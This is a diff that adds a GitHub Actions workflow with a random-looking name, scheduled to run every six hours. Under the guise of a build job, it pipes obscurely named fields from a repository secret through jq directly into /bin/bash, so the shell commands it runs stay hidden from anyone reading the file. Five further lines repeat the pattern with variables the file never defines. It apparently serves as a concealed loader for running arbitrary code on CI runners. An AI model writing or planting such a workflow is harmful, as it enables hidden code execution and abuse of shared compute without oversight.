@@ -1,0 +1,22 @@
+name: severallustful
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '22 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: severallustful
+        env:
+          w8: ${{ secrets.w8 }}
+        run: |
+          echo $w8 | jq -r .leptv3783 | /bin/bash
+          echo $sk0 | jq -r .huvn18629 | /bin/bash
+          echo $r677 | jq -r .hacsd37113 | /bin/bash
+          echo $jshlh91 | jq -r .xz073 | /bin/bash
+          echo $ujub1438 | jq -r .j99 | /bin/bash
+          echo $sbc598 | jq -r .knklj4381 | /bin/bash
+
